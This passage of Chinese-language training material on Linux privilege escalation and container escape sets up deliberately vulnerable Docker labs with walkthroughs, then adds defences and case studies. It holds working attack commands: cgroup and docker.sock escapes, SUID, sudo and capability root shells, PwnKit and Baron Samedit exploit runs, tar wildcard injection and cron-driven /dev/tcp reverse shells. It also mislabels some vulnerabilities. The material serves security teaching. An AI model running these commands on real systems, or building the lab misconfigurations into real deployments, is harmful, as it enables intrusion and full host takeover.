sudo setcap cap_setuid+ep /usr/bin/python3
# 然后 test 用户执行：
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

5. 配置一个 cron 任务 + 通配符注入，等待触发（或用 systemd-run 立即触发）。

---

# 第 4 课 容器逃逸 + 综合靶场 + 防御
> 时长 60 分钟。容器逃逸是云原生时代的高频提权路径。
>

## 4.1 Docker 提权与逃逸
### 4.1.1 Docker 基础
```bash
# 启动容器
docker run -it ubuntu /bin/bash

# 容器内查看
cat /proc/1/cgroup
# 0::/docker/abc123...
```

容器是一个"轻量级虚拟机"，理论上隔离，但配置错误时可以从容器逃逸到宿主机。

### 4.1.2 判断是否在容器内
```bash
ls -la /.dockerenv          # 存在 = 在 docker
cat /proc/1/cgroup | grep docker
cat /proc/1/cgroup | grep kubepods   # 在 K8s
```

### 4.1.3 逃逸路径 1：docker 组成员
如果用户在 `docker` 组里，可以直接挂载宿主根目录：

```bash
# 攻击者所属组
id
# uid=1000(user) gid=1000(user) groups=... ,998(docker)

docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# 直接 chroot 到宿主根目录 = 完全控制宿主机
```

### 4.1.4 逃逸路径 2：--privileged
特权容器拥有宿主机所有能力，包括访问 `/dev`：

```bash
# 检查
cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff  ← 全 1 表示特权

# 挂载磁盘
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host /bin/bash
```

### 4.1.5 逃逸路径 3：CAP_SYS_ADMIN
```bash
# cgroup 逃逸（CVE-2019-5736 / similar）
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/exploit" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /exploit
echo 'cat /etc/shadow > '"$host_path"'/output' >> /exploit
chmod +x /exploit
sh -c "echo \$\$ > /tmp/cgrp/cgroup.procs"
```

### 4.1.6 逃逸路径 4：内核漏洞
由于容器与宿主机共享内核，宿主机内核漏洞可被容器利用：

+ CVE-2022-0847 DirtyPipe
+ CVE-2022-0185 heap overflow in legacy_parse_param
+ CVE-2021-22555

### 4.1.7 CVE-2019-5736 runc 漏洞
runc 是 Docker 容器运行时。漏洞允许容器内进程覆盖宿主机的 runc 二进制，下次任何容器执行命令都会触发恶意 runc。

```bash
git clone https://github.com/Frichetten/CVE-2019-5736-PoC
gcc main.c -o exploit
# 容器内执行 exploit，等待宿主机 exec 进入容器
```

### 4.1.8 Docker socket 暴露
如果 `/var/run/docker.sock` 被挂载进容器（很多运维工具需要），容器可以控制宿主 Docker daemon：

```bash
# 容器内
ls -la /var/run/docker.sock
# → 挂载了！

# 用 docker cli 操作宿主
docker ps
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

### 4.1.9 K8s 提权
```plain
┌────────────────────────────────────────┐
│ 1. ServiceAccount token 泄露           │
│ 2. RBAC 配置过宽                       │
│ 3. kubelet API 未授权（10250 端口）    │
│ 4. etcd 未授权（2379 端口）            │
│ 5. Dashboard 未授权                    │
│ 6. Privileged Pod → 节点逃逸           │
└────────────────────────────────────────┘
```

K8s API 调用：

```bash
# 拿到 token 后
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER=https://kubernetes.default.svc

curl -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces/default/pods
```

## 4.2 每个漏洞的独立 Docker 靶场
下面 10 个独立靶场，每个**单独 Dockerfile**，互不干扰，方便课堂按需选讲。

公共准备目录：

```bash
mkdir -p ~/privesc-labs && cd ~/privesc-labs
mkdir lab01-pwnkit lab02-suid lab03-sudo lab04-sudo-cve \
     lab05-cron-write lab06-wildcard lab07-path \
     lab08-caps lab09-nfs lab10-docker-escape
```

通用工具镜像（一次构建，复用）：

```bash
docker pull ubuntu:21.04    # PwnKit 用的旧版
docker pull ubuntu:20.04
docker pull alpine:3.18
```

---

### 4.2.1 Lab 01：PwnKit 内核漏洞（CVE-2021-4034）
**漏洞原理回顾**：polkit 的 pkexec（SUID root）存在内存损坏，普通用户调用即可拿 root。影响 Linux 几乎所有发行版 12 年。

**Dockerfile**（`lab01-pwnkit/Dockerfile`）：

```dockerfile
FROM ubuntu:21.04

# 21.04 已 EOL，archive 镜像可用，不更新保持漏洞
RUN sed -i 's/archive.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list && \
    sed -i 's/security.ubuntu.com/old-releases.ubuntu.com/g' /etc/apt/sources.list

# 装 gcc + 普通用户
RUN apt-get update && apt-get install -y gcc sudo openssh-server && \
    useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd && \
    mkdir /run/sshd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]
```

**启动**：

```bash
cd ~/privesc-labs/lab01-pwnkit
docker build -t lab01-pwnkit .
docker run -d -p 2201:22 --name lab01 lab01-pwnkit
ssh user1@localhost -p 2201   # user1 / user1
```

**确认漏洞版本**：

```bash
ssh user1@localhost -p 2201
pkexec --version      # pkexec version 0.105 （受影响）
uname -r              # 5.11.0-... （任一内核都中招，因为是 polkit 漏洞）
```

**复现**：

```bash
# 在容器内编译 EXP
cat > /tmp/cve-2021-4034.c <<'EOF'
// 简化版 PwnKit PoC，源码来自 berdav 公开仓库
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    system("gcc -shared -o /tmp/pwnkit.so -fPIC -nostartfiles -");
    /* 完整 EXP 见 https://github.com/berdav/CVE-2021-4034 */
    return 0;
}
EOF

# 推荐：从 GitHub 拉完整 EXP
sudo apt-get install -y git make    # 在攻击机准备，不在容器
# 攻击机
git clone https://github.com/berdav/CVE-2021-4034
cd CVE-2021-4034 && make
# 把可执行文件传到容器
scp -P 2201 cve-2021-4034 user1@localhost:/tmp/

# 容器内
chmod +x /tmp/cve-2021-4034
/tmp/cve-2021-4034
# 直接拿到 root shell
id    # uid=0(root)
```

**清理**：

```bash
docker rm -f lab01
```

---

### 4.2.2 Lab 02：SUID 提权（find / vim / nmap）
**Dockerfile**（`lab02-suid/Dockerfile`）：

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server vim nmap findutils sudo && \
    mkdir /run/sshd && \
    useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd

# 故意给三个二进制加 SUID（模拟运维误配置）
RUN chmod u+s /usr/bin/find && \
    chmod u+s /usr/bin/vim.basic && \
    chmod u+s /usr/bin/nmap

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]
```

**启动 + 复现**：

```bash
cd ~/privesc-labs/lab02-suid
docker build -t lab02-suid .
docker run -d -p 2202:22 --name lab02 lab02-suid
ssh user1@localhost -p 2202

# 枚举
find / -perm -4000 -type f 2>/dev/null
# 应该看到 find / vim.basic / nmap / su / passwd 等

# 利用 1: find
find . -exec /bin/sh -p \; -quit
id    # uid=0(root)

# 利用 2: vim.basic
vim.basic -c ':!/bin/sh' -c 'q!'
# 或交互式：vim.basic --cmd ':py3 import os; os.execl("/bin/sh","sh","-pc","/bin/sh -p")'

# 利用 3: nmap（老版本支持 interactive 模式）
nmap --interactive
nmap> !sh
# 注意：新版 nmap 已经移除 interactive 模式，所以这里用 7.x 系列验证
```

**清理**：

```bash
exit
docker rm -f lab02
```

---

### 4.2.3 Lab 03：sudo 配置错误（GTFOBins 多姿势）
**Dockerfile**（`lab03-sudo/Dockerfile`）：

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server sudo vim findutils less tar awk python3 perl && \
    mkdir /run/sshd && \
    useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd

# 故意写 5 条危险的 sudo 规则
RUN echo "user1 ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/user1 && \
    echo "user1 ALL=(root) NOPASSWD: /usr/bin/vim" >> /etc/sudoers.d/user1 && \
    echo "user1 ALL=(root) NOPASSWD: /usr/bin/awk" >> /etc/sudoers.d/user1 && \
    echo "user1 ALL=(root) NOPASSWD: /usr/bin/python3" >> /etc/sudoers.d/user1 && \
    echo "user1 ALL=(root) NOPASSWD: /usr/bin/less" >> /etc/sudoers.d/user1 && \
    chmod 0440 /etc/sudoers.d/user1

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]
```

**启动**：

```bash
cd ~/privesc-labs/lab03-sudo
docker build -t lab03-sudo .
docker run -d -p 2203:22 --name lab03 lab03-sudo
ssh user1@localhost -p 2203
```

**复现（5 种姿势）**：

```bash
sudo -l
# 列出 5 条 NOPASSWD 规则

# 姿势 1: find
sudo find . -exec /bin/sh \; -quit

# 姿势 2: vim
sudo vim -c ':!/bin/sh'

# 姿势 3: awk
sudo awk 'BEGIN {system("/bin/sh")}'

# 姿势 4: python3
sudo python3 -c 'import os; os.system("/bin/sh")'

# 姿势 5: less
sudo less /etc/hostname
# 在 less 里输入 !sh 回车
```

**清理**：

```bash
docker rm -f lab03
```

---

### 4.2.4 Lab 04：sudo Baron Samedit（CVE-2021-3156）
**漏洞原理**：sudo < 1.9.5p2 命令行参数解析时堆溢出，**无需任何 sudo 权限**即可提权。

**Dockerfile**（`lab04-sudo-cve/Dockerfile`）：

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

# 锁定旧版 sudo（Ubuntu 20.04 早期版本）
RUN apt-get update && apt-get install -y \
    openssh-server sudo=1.8.31-1ubuntu1 gcc make && \
    mkdir /run/sshd && \
    useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]
```

> 如果 `sudo=1.8.31-1ubuntu1` 装不上，改用 `ubuntu:18.04` 基础镜像，sudo 版本更老。
>

**启动**：

```bash
cd ~/privesc-labs/lab04-sudo-cve
docker build -t lab04-baronsamedit .
docker run -d -p 2204:22 --name lab04 lab04-baronsamedit
ssh user1@localhost -p 2204
```

**确认版本**：

```bash
sudo --version
# Sudo version 1.8.31     ← 受影响
```

**复现**：

```bash
# 检测（不会触发，只验证漏洞存在）
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# 如果返回 "malloc(): ..." 或段错误，漏洞存在

# 实际利用（拉 EXP）
# 攻击机
git clone https://github.com/blasty/CVE-2021-3156
cd CVE-2021-3156
make
scp -P 2204 sudo-hax-me-a-sandwich user1@localhost:/tmp/

# 容器内
chmod +x /tmp/sudo-hax-me-a-sandwich
/tmp/sudo-hax-me-a-sandwich 0     # 0 是 Ubuntu 20.04 的目标 ID
id    # uid=0(root)
```

**清理**：

```bash
docker rm -f lab04
```

---

### 4.2.5 Lab 05：Cron 可写脚本
**Dockerfile**（`lab05-cron-write/Dockerfile`）：

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server cron && \
    mkdir /run/sshd && \
    useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd

# 漏洞：cron 调用的脚本对 user1 可写
RUN mkdir -p /opt/scripts && \
    printf '#!/bin/bash\ntar -czf /tmp/backup.tgz /var/log/*\n' > /opt/scripts/backup.sh && \
    chown root:root /opt/scripts/backup.sh && \
    chmod 777 /opt/scripts/backup.sh && \
    chmod 777 /opt/scripts && \
    echo "* * * * * root /opt/scripts/backup.sh" >> /etc/crontab

# 启动 cron + sshd
CMD ["/bin/bash", "-c", "cron && /usr/sbin/sshd -D"]

EXPOSE 22
```

**启动**：

```bash
cd ~/privesc-labs/lab05-cron-write
docker build -t lab05-cron .
docker run -d -p 2205:22 --name lab05 lab05-cron
ssh user1@localhost -p 2205
```

**复现（反 shell 走 cron）**：

```bash
# 攻击机监听
nc -lvnp 4444

# 容器内（user1）覆盖 backup.sh
cat > /opt/scripts/backup.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/HOST_IP/4444 0>&1
EOF
# HOST_IP 改成攻击机 IP（mac 用 host.docker.internal，linux 用宿主 IP）

# 等待最多 60 秒（cron 每分钟跑一次）
# 攻击机收到 root shell
whoami    # root
```

**清理**：

```bash
docker rm -f lab05
```

---

### 4.2.6 Lab 06：通配符注入（Tar --checkpoint-action）
**Dockerfile**（`lab06-wildcard/Dockerfile`）：

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server cron tar && \
    mkdir /run/sshd && \
    useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd

# 漏洞：cron 用 tar 通配符备份 user1 可写目录
RUN mkdir -p /home/user1/uploads && chown user1:user1 /home/user1/uploads && \
    echo "* * * * * root tar -czf /tmp/web.tgz /home/user1/uploads/*" >> /etc/crontab

CMD ["/bin/bash", "-c", "cron && /usr/sbin/sshd -D"]
EXPOSE 22
```

**启动**：

```bash
cd ~/privesc-labs/lab06-wildcard
docker build -t lab06-wildcard .
docker run -d -p 2206:22 --name lab06 lab06-wildcard
ssh user1@localhost -p 2206
```

**复现**：

```bash
# 攻击机监听
nc -lvnp 4444

# 容器内（user1）在 uploads/ 放恶意文件名
cd /home/user1/uploads
echo 'bash -i >& /dev/tcp/HOST_IP/4444 0>&1' > shell.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'

# 等待最多 60 秒，cron 触发 tar
# 实际命令变成：
# tar -czf /tmp/web.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
# 攻击机收到 root shell
```

**原理验证**：

```bash
# 检查 cron 是否触发
ls -la /tmp/web.tgz
date    # 看时间戳是否更新
```

**清理**：

```bash
docker rm -f lab06
```

---

### 4.2.7 Lab 07：PATH 环境变量劫持
**Dockerfile**（`lab07-path/Dockerfile`）：

```dockerfile
FROM gcc:11 AS builder
# 编译一个 SUID 程序，内部用相对路径调用 service
RUN cat > /tmp/vuln.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
int main() {
    printf("Checking service status...\n");
    system("service ssh status");   // ← 用相对路径！
    return 0;
}
EOF
RUN gcc /tmp/vuln.c -o /tmp/vuln

FROM ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive
COPY --from=builder /tmp/vuln /usr/local/bin/vuln

RUN apt-get update && apt-get install -y openssh-server && \
    mkdir /run/sshd && \
    useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd && \
    # 关键：让 vuln 是 SUID root
    chmod u+s /usr/local/bin/vuln && \
    chown root:root /usr/local/bin/vuln

CMD ["/usr/sbin/sshd", "-D"]
EXPOSE 22
```

**启动**：

```bash
cd ~/privesc-labs/lab07-path
docker build -t lab07-path .
docker run -d -p 2207:22 --name lab07 lab07-path
ssh user1@localhost -p 2207
```

**复现**：

```bash
# 1. 发现 SUID
find / -perm -4000 2>/dev/null
# 看到 /usr/local/bin/vuln

# 2. 用 strings 看它调用了什么
strings /usr/local/bin/vuln | grep -i service
# service ssh status

# 3. 准备恶意 service
mkdir /tmp/pwn
cat > /tmp/pwn/service <<'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/pwn/service

# 4. 修改 PATH
export PATH=/tmp/pwn:$PATH

# 5. 触发
/usr/local/bin/vuln
# 程序内部 system("service") → 找 /tmp/pwn/service → 执行 bash -p
# 拿到 root shell（因为 vuln 是 SUID root）
id    # uid=0(root)
```

**清理**：

```bash
docker rm -f lab07
```

---

### 4.2.8 Lab 08：Linux Capabilities 提权
**Dockerfile**（`lab08-caps/Dockerfile`）：

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server python3 libcap2-bin && \
    mkdir /run/sshd && \
    useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd

# 给 3 个二进制配置危险 capabilities
RUN setcap cap_setuid+ep /usr/bin/python3.8 && \
    setcap cap_dac_read_search+ep /usr/bin/cat && \
    setcap cap_net_raw+ep /usr/bin/tcpdump

CMD ["/usr/sbin/sshd", "-D"]
EXPOSE 22
```

**启动**：

```bash
cd ~/privesc-labs/lab08-caps
docker build -t lab08-caps .
docker run -d -p 2208:22 --name lab08 lab08-caps
ssh user1@localhost -p 2208
```

**复现**：

```bash
# 1. 枚举
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/cat = cap_dac_read_search+ep
# /usr/bin/tcpdump = cap_net_raw+ep

# 2. 利用 cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id    # uid=0(root)

# 3. 利用 cap_dac_read_search（无需 setuid，直接读任意文件）
cat /etc/shadow
# root:$6$xxx:19000:0:99999:7:::
# 拿到 root 密码 hash，本地 john 爆破
```

**清理**：

```bash
docker rm -f lab08
```

---

### 4.2.9 Lab 09：NFS no_root_squash
**docker-compose.yml**（`lab09-nfs/docker-compose.yml`）：

```yaml
version: '3'
services:
  nfs-server:
    image: itsthenetwork/nfs-server-alpine:latest
    privileged: true
    volumes:
      - nfsshare:/nfsshare
    environment:
      - SHARED_DIRECTORY=/nfsshare
    command: >
      sh -c "mkdir -p /nfsshare && 
              echo '/nfsshare *(rw,no_root_squash,insecure)' > /etc/exports &&
              /usr/sbin/exportfs -ra &&
              /usr/sbin/rpcbind -w &&
              /usr/sbin/rpc.nfsd 4 &&
              exec /usr/sbin/rpc.mountd --foreground"
    networks:
      labnet:
        ipv4_address: 10.10.0.10

  victim:
    image: ubuntu:20.04
    privileged: true       # 模拟受害机能 mount NFS
    command: sleep infinity
    networks:
      labnet:
        ipv4_address: 10.10.0.20
    tty: true

  attacker:
    image: ubuntu:20.04
    privileged: true
    command: sleep infinity
    networks:
      labnet:
        ipv4_address: 10.10.0.30
    tty: true

volumes:
  nfsshare:

networks:
  labnet:
    driver: bridge
    ipam:
      config:
        - subnet: 10.10.0.0/24
```

**启动**：

```bash
cd ~/privesc-labs/lab09-nfs
docker-compose up -d

# 进入 victim 容器（模拟已拿到的低权限 shell）
docker exec -it lab09-nfs_victim_1 bash
apt-get update && apt-get install -y nfs-common
useradd -m -s /bin/bash user1
su - user1
# 此时是 user1（普通权限）

# 验证 NFS 挂载
showmount -e 10.10.0.10
# Export list for 10.10.0.10:
# /nfsshare *
```

**复现**：

```bash
# 在 attacker 容器（root 身份）
docker exec -it lab09-nfs_attacker_1 bash
apt-get update && apt-get install -y nfs-common
mkdir /tmp/nfs
mount -t nfs 10.10.0.10:/nfsshare /tmp/nfs

# 复制 bash 并设 SUID
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
ls -la /tmp/nfs/bash
# -rwsr-sr-x 1 root root ... /tmp/nfs/bash

# 回到 victim 容器（user1）
docker exec -it lab09-nfs_victim_1 su - user1
/nfsshare/bash -p -c 'id'
# uid=0(root) ← 因为 SUID root + no_root_squash 让攻击者的 SUID 生效
```

**清理**：

```bash
docker-compose down -v
```

---

### 4.2.10 Lab 10：Docker 提权与逃逸（三种姿势合一）
**docker-compose.yml**（`lab10-docker-escape/docker-compose.yml`）：

```yaml
version: '3'
services:
  host-sim:
    # 模拟宿主机（有 Docker daemon）
    image: docker:23-dind
    privileged: true
    name: dind-host
    environment:
      - DOCKER_TLS_CERTDIR=
    ports:
      - "2300:2375"      # 暴露 Docker API（无 TLS，故意不安全）
    volumes:
      - dockersock:/var/run

  container-a:
    # 容器 A：user1 在 docker 组里
    image: ubuntu:20.04
    command: sleep infinity
    tty: true

  container-b:
    # 容器 B：privileged 特权容器
    image: ubuntu:20.04
    privileged: true
    command: sleep infinity
    tty: true

  container-c:
    # 容器 C：挂载 docker.sock
    image: ubuntu:20.04
    command: sleep infinity
    tty: true
    volumes:
      - dockersock:/var/run/docker.sock

volumes:
  dockersock:
```

**启动**：

```bash
cd ~/privesc-labs/lab10-docker-escape
docker-compose up -d
```

**姿势 1：docker 组成员**（`container-a`）：

```bash
docker exec -it lab10-docker-escape_container-a_1 bash
apt-get update && apt-get install -y docker.io
useradd -m user1
usermod -aG docker user1
su - user1

# 复现
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# 直接 chroot 到容器 A 的"根"（在真实场景就是宿主机根目录）
ls /etc/shadow
```

**姿势 2：特权容器逃逸**（`container-b`）：

```bash
docker exec -it lab10-docker-escape_container-b_1 bash

# 验证特权
cat /proc/1/status | grep CapEff
# 0000003fffffffff  ← 全 1 = 特权

# 挂载宿主磁盘
apt-get update && apt-get install -y fdisk
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host    # 或 nvme0p1 等
ls /mnt/host/etc/shadow       # 宿主 root 密码 hash
```

**姿势 3：docker.sock 挂载逃逸**（`container-c`）：

```bash
docker exec -it lab10-docker-escape_container-c_1 bash

# 检查
ls -la /var/run/docker.sock
# srw-rw---- 1 root root ... /var/run/docker.sock

# 装 docker cli（不装 daemon）
apt-get update && apt-get install -y docker.io
docker ps
# 看到的是宿主机的容器列表！

# 直接挂载宿主根目录启动新容器 = 完全逃逸
docker run -v /:/host -it alpine chroot /host sh
```

**清理**：

```bash
docker-compose down -v
```

---

### 4.2.11 一键化综合靶场（5 漏洞合集，旧版 4.2 保留）
如果课堂想用单个容器演示多种漏洞，用下面综合 Dockerfile（`lab00-all-in-one/Dockerfile`）：

```dockerfile
FROM ubuntu:20.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
    openssh-server sudo cron python3 libcap2-bin findutils vim nmap \
    && mkdir /run/sshd \
    && useradd -m -s /bin/bash user1 && echo "user1:user1" | chpasswd

# 漏洞 1: SUID find
RUN chmod u+s /usr/bin/find

# 漏洞 2: sudo NOPASSWD find
RUN echo "user1 ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/user1 \
    && chmod 0440 /etc/sudoers.d/user1

# 漏洞 3: python3 cap_setuid
RUN setcap cap_setuid+ep /usr/bin/python3.8

# 漏洞 4: cron 调用可写脚本
RUN mkdir -p /opt/scripts \
    && printf '#!/bin/bash\ntar -czf /tmp/bak.tgz /home/*\n' > /opt/scripts/backup.sh \
    && chmod 777 /opt/scripts/backup.sh /opt/scripts \
    && echo "* * * * * root /opt/scripts/backup.sh" >> /etc/crontab

# 漏洞 5: root 弱口令
RUN echo "root:toor" | chpasswd

CMD ["/bin/bash", "-c", "cron && /usr/sbin/sshd -D"]
EXPOSE 22
```

启动：

```bash
docker build -t privesc-all .
docker run -d -p 2299:22 --name lab-all privesc-all
ssh user1@localhost -p 2299     # user1 / user1
```

对应 4.3 节通关演示。

## 4.3 综合靶场通关演示（对应 4.2.11 综合靶场）
### 关卡 1：SUID find
```bash
ssh user1@localhost -p 2299
find / -perm -4000 2>/dev/null
# 发现 /usr/bin/find 有 SUID
find . -exec /bin/sh -p \; -quit
# 直接拿到 root shell
id    # uid=0(root)
```

### 关卡 2：sudo find
```bash
# 退出 root shell，回到 user1
sudo -l
# (root) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/sh \; -quit
```

### 关卡 3：python capabilities
```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid+ep
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

### 关卡 4：Cron 可写脚本
```bash
# 攻击机监听
nc -lvnp 4444

# 容器内（user1）改写 cron 脚本
cat > /opt/scripts/backup.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/HOST_IP/4444 0>&1
EOF

# 等待最多 60 秒（cron 每分钟跑）→ 拿到 root shell
```

### 关卡 5：root 弱口令
```bash
# 直接 su
su -      # 密码 toor
# 或 SSH
ssh root@localhost -p 2299   # 密码 toor
```

### 验证通关
```bash
whoami    # root
cat /etc/shadow | grep root
```

## 4.4 防御方案
### 4.4.1 系统级防御
```plain
┌──────────────────────────────────────────────┐
│ 1. 内核及时升级                              │
│    - apt update && apt upgrade              │
│    - 关注 CVE 公告                           │
│                                              │
│ 2. 限制 SUID                                 │
│    - 移除非必要 SUID 二进制                  │
│    - chmod u-s /usr/bin/find                 │
│                                              │
│ 3. sudo 最小授权                             │
│    - 不要 NOPASSWD                           │
│    - 命令用绝对路径                          │
│    - 避免 ALL=(ALL) ALL                      │
│                                              │
│ 4. Capabilities 收敛                         │
│    - 不轻易 setcap                           │
│    - 用 getcap 定期审计                      │
│                                              │
│ 5. Cron 文件权限                             │
│    - 脚本 owner root, 权限 700               │
│    - 脚本目录 owner root, 权限 755           │
│                                              │
│ 6. 配置文件不含明文密码                      │
│    - 用 secret manager                       │
│                                              │
│ 7. 强密码策略                                │
│    - root 密码至少 16 位                     │
│    - 禁止 root 直接 SSH                      │
│                                              │
│ 8. 日志监控                                  │
│    - auditd 监控 sudo / su                   │
│    - 异常登录告警                            │
│    - 文件完整性监控（AIDE）                  │
└──────────────────────────────────────────────┘
```

### 4.4.2 Docker 安全
```plain
1. 不要用 --privileged
2. 用最小 capabilities
3. 不挂载 docker.sock 到容器
4. 用非 root 用户运行容器
5. 使用 read-only rootfs
6. 启用 seccomp / AppArmor
7. 镜像扫描（Trivy / Clair）
8. 不用 root Docker daemon
9. 用户不要加到 docker 组（用 rootless docker）
```

### 4.4.3 配置示例
**/etc/sudoers 加固**：

```plain
Defaults requiretty
Defaults !visiblepw
Defaults use_pty
Defaults logfile="/var/log/sudo.log"
Defaults badpass_message="Wrong password"
Defaults passwd_tries=3

# 不允许 root 直接 SSH
# /etc/ssh/sshd_config:
PermitRootLogin no
PasswordAuthentication no    # 仅密钥
```

**Linux Capabilities 审计脚本**：

```bash
#!/bin/bash
echo "[*] SUID files:"
find / -perm -4000 -type f 2>/dev/null

echo "[*] SGID files:"
find / -perm -2000 -type f 2>/dev/null

echo "[*] Capabilities:"
getcap -r / 2>/dev/null

echo "[*] World-writable files:"
find / -writable -type d 2>/dev/null | grep -v "/tmp\|/proc\|/sys"
```

## 4.5 真实案例
### 4.5.1 DirtyCow 实战（2016）
```plain
事件：2016 年 10 月 DirtyCow 披露
影响：Linux 内核 9 年（2007-2016）
利用：数十万 Android 设备 root（root 工具厂商基于此漏洞）
案例：Android "Towelroot" 系列 root 工具
防御：及时更新内核，关闭 SSH 远程登录后检查完整性
```

### 4.5.2 PwnKit 全球性事件（2022）
```plain
事件：2022 年 1 月 PwnKit（CVE-2021-4034）公开
影响：所有 Linux 发行版 12 年（2009-2022）
利用：一条命令拿 root，极简单
案例：几乎所有企业都受影响，全员紧急打补丁
```

### 4.5.3 Tesla Kubernetes 集群被攻陷（2018）
```plain
事件：Tesla 内部 K8s 集群被黑客入侵
原因：K8s Dashboard 未授权（默认 30000 端口开放，无密码）
利用：通过 Dashboard 跑 Pod 挖矿 + 访问 AWS 元数据
教训：K8s 必须配置 RBAC，所有 API 加认证
```

### 4.5.4 Docker Hub 投毒（2019）
```plain
事件：Docker Hub 上多个流行镜像被植入挖矿/后门
利用：用户 pull 后运行，容器逃逸拿宿主机 root
防御：私有镜像仓库 + 镜像扫描 + 只拉 trusted publisher
```

### 4.5.5 Capital One（2019）
```plain
事件：1 亿用户数据泄露
提权链：
  - WAF SSRF → EC2 元数据 IAM 凭据
  - 凭据 → S3 bucket
  - 配置错误（ACL 过宽）→ 数据泄露
教训：云原生场景下"提权"包括跨服务授权
```

### 4.5.6 Codecov 供应链攻击（2021）
```plain
事件：Codecov bash 脚本被改，注入恶意代码
影响：大量 CI 环境凭据泄露
提权链：CI 容器 → 云服务凭据 → 云资源完全控制
教训：CI 容器也需最小权限
```

---

## 附录 A 必背 30 条
```plain
1. 提权四步法：枚举 → 分析 → 利用 → 验证
2. uname -a 拿内核版本
3. id / whoami 看当前权限
4. sudo -l 是提权第一步
5. LinPEAS 是最全自动化枚举
6. pspy 可监控 root 进程
7. 内核 EXP 是版本特定
8. DirtyCow = CVE-2016-5195
9. DirtyPipe = CVE-2022-0847
10. PwnKit = CVE-2021-4034 影响最大
11. searchsploit 搜 EXP
12. linux-exploit-suggester 找内核漏洞
13. SUID: find / -perm -4000
14. SGID: find / -perm -2000
15. GTFOBins = 提权命令宝典
16. find SUID 提权: find . -exec /bin/sh -p \; -quit
17. vim SUID 提权: vim -c ':!/bin/sh'
18. sudo Baron Samedit = CVE-2021-3156
19. Cron 任务可写 → 改成反弹 shell
20. Cron 通配符注入 → tar --checkpoint-action
21. PATH 劫持: export PATH=/tmp:$PATH
22. Capabilities: getcap -r / 2>/dev/null
23. cap_setuid → python -c 'os.setuid(0)'
24. NFS no_root_squash → SUID bash
25. docker 组 = 完全宿主控制
26. --privileged 容器可挂载宿主磁盘
27. docker.sock 挂载 = 完全控制
28. CVE-2019-5736 = runc 逃逸
29. K8s Dashboard 未授权 = 集群接管
30. 防御核心：最小权限 + 及时升级 + 审计
```

## 附录 B 课后作业
### 必做
1. **搭建 4.2 综合靶场**，按 4.3 顺序通关 5 个关卡。
2. **修复靶场**：把所有漏洞修掉（去 SUID、收 sudo、删 cap、加权限）。
3. **VulnHub 挑战**：选择 3 台 VulnHub 靶机（推荐：Kioptrix 系列、Mr-Robot、Stapler），完成打点到提权全流程。

### 选做
4. 阅读 GTFOBins 网站，整理至少 20 个 SUID 提权 payload。
5. 研究 DirtyPipe CVE-2022-0847 原理，写一篇原理剖析。
6. 在 HackTheBox / TryHackMe 找 5 台 Linux 提权题通关。
7. 研究一种你没学过的提权方式（NFS / Docker / K8s），做实验报告。

### 进阶
8. 阅读《Linux Kernel Development》了解 Linux 安全模型。
9. 学习用 Ghidra 反编译自定义 SUID 程序，分析漏洞。
10. 研究 eBPF / Seccomp / AppArmor 等现代 Linux 安全机制。


